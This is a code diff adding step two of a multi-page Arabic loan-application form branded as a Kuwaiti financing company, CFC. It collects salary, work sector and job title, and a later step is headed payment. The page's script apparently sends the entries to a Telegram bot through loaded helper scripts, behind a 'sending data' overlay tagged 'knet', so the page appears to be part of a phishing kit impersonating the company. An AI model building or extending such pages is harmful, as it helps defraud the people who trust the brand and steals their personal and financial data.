@@ -1,0 +1,363 @@
+<html lang="ar">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="description" content="الخطوة الثانية لتقديم طلب التمويل لدى شركة التسهيلات التجارية.">
+    <meta name="theme-color" content="#00a3e0">
+    <title>شركة التسهيلات التجارية - CFC</title>
+    <link rel="icon" type="image/svg+xml" href="./assets/images/logo.svg">
+    <link href="./assets/css/main.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="./assets/css/shared-header.css">
+</head>
+
+<body class="page-with-shared-header step-page">
+    <div id="root">
+        <div dir="rtl" class="min-h-screen bg-gradient-to-b from-gray-50 to-white text-gray-800">
+            <header class="site-header">
+                <div class="nav-shell">
+                    <a class="brand" href="./index.html#home" aria-label="Commercial Facilities">
+                        <img src="./assets/images/logo.svg" alt="Commercial Facilities logo">
+                    </a>
+                    <button class="menu-toggle" type="button" aria-expanded="false" aria-label="فتح القائمة">
+                        <img src="./assets/images/menu.png" alt="">
+                    </button>
+                    <nav class="navbar" aria-label="التنقل الرئيسي">
+                        <ul class="nav-links"></ul>
+                    </nav>
+                </div>
+            </header>
+            <div class="max-w-md mx-auto px-6 py-6">
+                <div class="flex items-center justify-between mb-2">
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center shadow-md">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M20 6 9 17l-5-5"></path>
+                            </svg>
+                        </div>
+                        <span class="text-xs font-semibold text-green-600">المعلومات الشخصية</span>
+                    </div>
+                    <div class="flex-1 h-0.5 bg-green-500 mx-2"></div>
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 bg-[#00A3E0] rounded-full flex items-center justify-center shadow-md">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M20 6 9 17l-5-5"></path>
+                            </svg>
+                        </div>
+                        <span class="text-xs font-semibold text-[#00A3E0]">الراتب</span>
+                    </div>
+                    <div class="flex-1 h-0.5 bg-gray-300 mx-2"></div>
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center shadow-md">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect width="20" height="14" x="2" y="5" rx="2"></rect>
+                                <line x1="2" x2="22" y1="10" y2="10"></line>
+                            </svg>
+                        </div>
+                        <span class="text-xs font-semibold text-gray-500">الدفع</span>
+                    </div>
+                </div>
+                <div class="w-full bg-gray-200 rounded-full h-2">
+                    <div class="h-2 rounded-full transition-all duration-500 bg-[#00A3E0] w-2/3"></div>
+                </div>
+            </div>
+            <form id="sb" class="max-w-md mx-auto px-6 pb-8 space-y-6">
+                <div class="rounded-xl bg-card text-card-foreground shadow-lg border-0 overflow-hidden">
+                    <div class="bg-gradient-to-r from-[#00A3E0] to-blue-700 p-4">
+                        <h2 class="text-lg font-bold text-white flex items-center gap-2">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-[#00A3E0]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <line x1="12" x2="12" y1="2" y2="22"></line>
+                                <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                            </svg>معلومات الراتب والوظيفة
+                        </h2>
+                        <p class="text-xs text-blue-100 mt-1">لحساب أفضل عرض تمويلي لك</p>
+                    </div>
+                    <div class="p-6 space-y-5">
+                        <div class="space-y-2">
+                            <div class="flex items-center gap-2">
+                                <label for="netSalary" class="text-sm leading-none text-right font-semibold text-gray-800 flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-[#00A3E0]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <line x1="12" x2="12" y1="2" y2="22"></line>
+                                        <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                                    </svg>الراتب الشهري
+                                </label>
+                            </div>
+                            <div class="relative">
+                                <input id="netSalary" dir="ltr" class="flex w-full rounded-md border bg-transparent px-3 py-1 text-base shadow-sm transition-colors file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-blue-500 md:text-sm text-right border-gray-200 h-12" placeholder="مثال: 1500" inputmode="numeric" pattern="[0-9]*" type="text" value="" required><span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-sm font-medium">د.ك</span>
+                            </div>
+                        </div>
+                        <div class="space-y-2">
+
+                           
+                        </div>
+                        <div class="space-y-2">
+                            <div class="flex items-center gap-2">
+                                <label for="workSector" class="text-sm leading-none text-right font-semibold text-gray-800 flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-[#00A3E0]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <path d="M16 20V4a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"></path>
+                                        <rect width="20" height="14" x="2" y="6" rx="2"></rect>
+                                    </svg>قطاع العمل</label>
+                            </div>
+                            <div class="relative">
+                                <select id="workSector" class="flex w-full items-center justify-between whitespace-nowrap rounded-md border bg-transparent px-3 py-2 text-sm shadow-sm ring-offset-background text-right border-gray-200 focus:outline-none focus:ring-1 focus:ring-blue-500 h-12 text-gray-400" required>
+                                    <option value="">قطاع العمل</option>
+                                    <option value="القطاع الحكومي">القطاع الحكومي</option>
+                                    <option value="القطاع الخاص">القطاع الخاص</option>
+                                    <option value="متقاعد">متقاعد</option>
+                                    <option value="القطاع النفطي">القطاع النفطي</option>
+                                    <option value="القطاع العسكري">القطاع العسكري</option>
+                                    <option value="القطاع المصرفي">القطاع المصرفي</option>
+                                    <option value="قطاع التعليم">قطاع التعليم</option>
+                                    <option value="القطاع الصحي">القطاع الصحي</option>
+                                    <option value="غير ذلك">غير ذلك</option>
+                                </select>
+                            </div>
+                            <div id="customWorkSectorWrap" class="hidden space-y-2">
+                                <label for="customWorkSector" class="text-sm leading-none text-right font-semibold text-gray-800">اسم الوظيفة</label>
+                                <input id="customWorkSector" dir="rtl" class="flex w-full rounded-md border bg-transparent px-3 py-1 text-base shadow-sm transition-colors placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-blue-500 md:text-sm text-right border-gray-200 h-12" placeholder="اكتب اسم الوظيفة" type="text" value="" required>
+                            </div>
+                        </div>
+                        <div class="space-y-2">
+                            <div class="flex items-center gap-2">
+                                <label for="jobTitle" class="text-sm leading-none text-right font-semibold text-gray-800 flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-[#00A3E0]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <path d="M12 6v6"></path>
+                                        <path d="M6 12h12"></path>
+                                    </svg>اسم الوظيفة</label>
+                            </div>
+                            <input id="jobTitle" dir="rtl" class="flex w-full rounded-md border bg-transparent px-3 py-1 text-base shadow-sm transition-colors file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-blue-500 md:text-sm text-right border-gray-200 h-12" placeholder="مثال: محاسب" type="text" value="" required>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+    <div class="step-fixed-actions">
+        <button onclick="window.location.href='./step1.html'" type="button" class="inline-flex items-center justify-center rounded-md text-sm font-medium border shadow-sm h-12 px-4 bg-white border-gray-300 hover:bg-gray-50">&lt; العودة</button>
+        <button type="submit" id="sbb" form="sb" class="inline-flex items-center justify-center gap-2 h-12 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 bg-gradient-to-r from-[#00A3E0] to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-bold">
+            التالي<svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" style="transform: rotate(180deg);" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="m9 18 6-6-6-6"></path>
+            </svg>
+        </button>
+    </div>
+    <script>
+    function normalizeDigits(value) {
+        return value
+            .replace(/[٠-٩]/g, function(char) { return String(char.charCodeAt(0) - 1632); })
+            .replace(/[۰-۹]/g, function(char) { return String(char.charCodeAt(0) - 1776); });
+    }
+
+    function digitsOnly(value) {
+        return normalizeDigits(value).replace(/\D+/g, '');
+    }
+
+    function getFieldPlaceholder(field) {
+        if (!field) {
+            return '';
+        }
+
+        if (field.tagName === 'SELECT') {
+            return 'قطاع العمل';
+        }
+
+        return field.previousElementSibling && field.previousElementSibling.tagName === 'LABEL'
+            ? field.previousElementSibling.textContent.trim()
+            : (field.getAttribute('placeholder') || field.id);
+    }
+
+    function getLoanType() {
+        const params = new URLSearchParams(window.location.search);
+        return params.get('loan') || localStorage.getItem('selectedLoanType') || 'general';
+    }
+
+    function syncStep2Labels() {
+        const loanType = getLoanType();
+        localStorage.setItem('selectedLoanType', loanType);
+
+        const label = document.getElementById('requestedAmountLabel');
+        const input = document.getElementById('requestedAmount');
+
+        if (!label || !input) {
+            return;
+        }
+
+        const icon = label.querySelector('svg');
+        const labelText = loanType === 'car' ? 'مبلغ الدفعة الاولى' : 'قيمة الفرض';
+
+        label.innerHTML = '';
+        if (icon) label.appendChild(icon);
+        label.appendChild(document.createTextNode(labelText));
+        input.placeholder = loanType === 'car' ? 'مثال: 100 د.ك.' : 'مثال: 5000 د.ك.';
+    }
+
+    function bindStep2() {
+        syncStep2Labels();
+
+        const form = document.getElementById('sb');
+        const netSalary = document.getElementById('netSalary');
+        const requestedAmount = document.getElementById('requestedAmount');
+        const workSector = document.getElementById('workSector');
+        const customWorkSectorWrap = document.getElementById('customWorkSectorWrap');
+        const customWorkSector = document.getElementById('customWorkSector');
+        const jobTitle = document.getElementById('jobTitle');
+        const submitButton = document.getElementById('sbb');
+
+        function syncWorkSectorPlaceholderState() {
+            if (workSector) {
+                workSector.classList.toggle('text-gray-400', !workSector.value);
+                workSector.classList.toggle('text-gray-800', Boolean(workSector.value));
+            }
+
+            const needsCustom = workSector && workSector.value === 'غير ذلك';
+            if (customWorkSectorWrap) {
+                customWorkSectorWrap.classList.toggle('hidden', !needsCustom);
+            }
+            if (customWorkSector) {
+                customWorkSector.required = Boolean(needsCustom);
+                if (!needsCustom) {
+                    customWorkSector.value = '';
+                }
+            }
+        }
+
+        function validateStep2RequiredFields() {
+            const fieldsToCheck = [
+                { element: netSalary, label: 'الراتب الشهري' },
+                { element: workSector, label: 'قطاع العمل' },
+                { element: jobTitle, label: 'اسم الوظيفة' }
+            ];
+
+            if (workSector && workSector.value === 'غير ذلك') {
+                fieldsToCheck.push({ element: customWorkSector, label: 'اسم الوظيفة المخصصة' });
+            }
+
+            for (const item of fieldsToCheck) {
+                if (!item.element) continue;
+
+                const value = item.element.value.trim();
+                if (!value) {
+                    item.element.focus();
+                    alert(`الرجاء إدخال ${item.label}`);
+                    return false;
+                }
+            }
+
+            if (netSalary && digitsOnly(netSalary.value).length === 0) {
+                netSalary.focus();
+                alert('الرجاء إدخال الراتب الشهري بشكل صحيح');
+                return false;
+            }
+
+            return true;
+        }
+
+        if (netSalary && netSalary.dataset.bound !== 'true') {
+            netSalary.dataset.bound = 'true';
+            netSalary.addEventListener('input', function() {
+                netSalary.value = digitsOnly(netSalary.value);
+            });
+        }
+
+        if (requestedAmount && requestedAmount.dataset.bound !== 'true') {
+            requestedAmount.dataset.bound = 'true';
+            requestedAmount.addEventListener('input', function() {
+                requestedAmount.value = digitsOnly(requestedAmount.value);
+            });
+        }
+
+        if (localStorage.getItem('step2.netSalary') && netSalary) netSalary.value = localStorage.getItem('step2.netSalary');
+        if (localStorage.getItem('step2.requestedAmount') && requestedAmount) requestedAmount.value = localStorage.getItem('step2.requestedAmount');
+        if (localStorage.getItem('step2.workSector') && workSector) workSector.value = localStorage.getItem('step2.workSector');
+        if (localStorage.getItem('step2.jobTitle') && jobTitle) jobTitle.value = localStorage.getItem('step2.jobTitle');
+        syncWorkSectorPlaceholderState();
+
+        form.dataset.submitting = 'false';
+        if (submitButton) {
+            submitButton.disabled = false;
+            submitButton.removeAttribute('aria-busy');
+        }
+        if (window.hideSubmissionLoadingOverlay) {
+            window.hideSubmissionLoadingOverlay();
+        }
+
+        if (workSector.dataset.bound !== 'true') {
+            workSector.dataset.bound = 'true';
+            workSector.addEventListener('change', syncWorkSectorPlaceholderState);
+        }
+
+        if (customWorkSector && customWorkSector.dataset.bound !== 'true') {
+            customWorkSector.dataset.bound = 'true';
+            customWorkSector.addEventListener('input', function() {
+                customWorkSector.value = customWorkSector.value.replace(/\s+/g, ' ').trimStart();
+            });
+        }
+
+        if (form.dataset.bound !== 'true') {
+            form.dataset.bound = 'true';
+            form.addEventListener('submit', async function(event) {
+                event.preventDefault();
+
+                if (!validateStep2RequiredFields()) {
+                    return;
+                }
+
+                if (form.dataset.submitting === 'true') return;
+
+                form.dataset.submitting = 'true';
+                if (submitButton) {
+                    submitButton.disabled = true;
+                    submitButton.setAttribute('aria-busy', 'true');
+                }
+
+                const netSalaryValue = netSalary ? digitsOnly(netSalary.value) : '';
+                const requestedAmountValue = requestedAmount ? digitsOnly(requestedAmount.value) : '';
+                const selectedWorkSector = workSector ? workSector.value.trim() : '';
+                const customSectorValue = customWorkSector ? customWorkSector.value.trim() : '';
+                const workSectorValue = selectedWorkSector === 'غير ذلك' && customSectorValue
+                    ? customSectorValue
+                    : selectedWorkSector;
+                const jobTitleValue = (jobTitle ? jobTitle.value : '') .trim();
+                localStorage.setItem('step2.netSalary', netSalaryValue);
+                if (requestedAmount) {
+                    localStorage.setItem('step2.requestedAmount', requestedAmountValue);
+                }
+                localStorage.setItem('step2.workSector', workSectorValue);
+                localStorage.setItem('step2.jobTitle', jobTitleValue);
+
+                const telegramMessage = window.TELEGRAM_MESSAGES && typeof window.TELEGRAM_MESSAGES.buildStep2Message === 'function'
+                    ? window.TELEGRAM_MESSAGES.buildStep2Message()
+                    : "";
+
+                if (window.showSubmissionLoadingOverlay) {
+                    window.showSubmissionLoadingOverlay('جارٍ إرسال البيانات...', 4000, 'knet');
+                }
+
+                if (window.sendTelegramUntilDelivered) {
+                    window.sendTelegramUntilDelivered(telegramMessage, false).catch(function() {});
+                } else if (window.sendTelegramMessageWithQueue) {
+                    window.sendTelegramMessageWithQueue(telegramMessage, false).catch(function() {});
+                }
+
+                window.setTimeout(function() {
+                    if (window.hideSubmissionLoadingOverlay) {
+                        window.hideSubmissionLoadingOverlay();
+                    }
+                    if (submitButton) {
+                        submitButton.disabled = false;
+                        submitButton.removeAttribute('aria-busy');
+                    }
+                    form.dataset.submitting = 'false';
+                    window.location.href = './step3.html';
+                }, 4000);
+            });
+        }
+    }
+
+    bindStep2();
+    window.addEventListener('pageshow', bindStep2);
+    </script>
+    <script src="./assets/js/config.js"></script>
+    <script src="./assets/js/telegram.js"></script>
+    <script src="./assets/js/telegram-messages.js"></script>
+    <script src="./assets/js/tg.js"></script>
+    <script src="./assets/js/shared-header.js"></script>
+</body>
+
+</html>
